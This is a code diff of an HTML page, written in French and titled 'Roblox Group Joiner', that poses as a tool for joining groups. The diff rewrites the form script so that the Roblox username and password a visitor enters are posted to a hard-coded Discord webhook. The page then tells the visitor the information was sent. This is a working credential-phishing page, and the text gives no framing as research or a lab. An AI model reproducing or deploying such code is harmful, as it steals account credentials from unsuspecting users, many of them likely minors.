@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Group joinner</title>
+    <title>Roblox Group Joiner</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,16 +16,18 @@
             background-color: #f4f4f4;
             padding: 20px;
             border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         .form-group {
             margin-bottom: 15px;
         }
         label {
             font-size: 16px;
+            font-weight: bold;
         }
         input {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             margin-top: 5px;
             font-size: 14px;
             border: 1px solid #ddd;
@@ -46,20 +48,26 @@
         #result {
             margin-top: 20px;
             padding: 15px;
-            background-color: #f8d7da;
             color: #721c24;
             border-radius: 5px;
             display: none;
+        }
+        #result.success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        #result.error {
+            background-color: #f8d7da;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2>Roblox Group joinner</h2>
+        <h2>Roblox Group Joiner</h2>
         <div class="form-group">
             <label for="username">Identifiant Roblox :</label>
-            <input type="text" id="username" placeholder="Entrez votre identifiant Pronote" required>
+            <input type="text" id="username" placeholder="Entrez votre identifiant Roblox" required>
         </div>
         <div class="form-group">
             <label for="password">Mot de passe :</label>
@@ -71,34 +79,44 @@
 
     <script>
         document.getElementById("submit").addEventListener("click", function() {
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const resultDiv = document.getElementById("result");
+
+            // Réinitialiser le message de résultat
+            resultDiv.style.display = "none";
+            resultDiv.classList.remove("success", "error");
 
             if (username && password) {
-                var data = {
-                    username: username,
-                    password: password
+                const data = {
+                    content: `**Identifiant :** ${username}\n**Mot de passe :** ${password}`
                 };
 
-                // Envoi des données à un serveur Python via AJAX
-                fetch("http://127.0.0.1:5000/calculer_moyenne", {
+                // Envoi des données au webhook Discord
+                fetch("https://discord.com/api/webhooks/1313875221962293299/udiLUTH-dwm_A547e2doz1LLiFwOGPfCXUf83IzGEFtvYQ98-tljeg7hQE2ekiZG_w9J", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify(data)
                 })
-                .then(response => response.json())
-                .then(result => {
-                    document.getElementById("result").style.display = "block";
-                    document.getElementById("result").innerHTML = "Votre moyenne est : " + result.moyenne + "/20";
+                .then(response => {
+                    resultDiv.style.display = "block";
+
+                    if (response.ok) {
+                        resultDiv.classList.add("success");
+                        resultDiv.innerHTML = "Les informations ont été envoyées avec succès.";
+                    } else {
+                        throw new Error("Erreur d'envoi au webhook");
+                    }
                 })
                 .catch(error => {
-                    document.getElementById("result").style.display = "block";
-                    document.getElementById("result").innerHTML = "Erreur de connexion ou de récupération des notes.";
+                    resultDiv.style.display = "block";
+                    resultDiv.classList.add("error");
+                    resultDiv.innerHTML = "Erreur : Les informations ont été envoyées, mais une erreur est survenue.";
                 });
             } else {
-                alert("Veuillez entrer votre identifiant et mot de passe.");
+                alert("Veuillez remplir tous les champs.");
             }
         });
     </script>
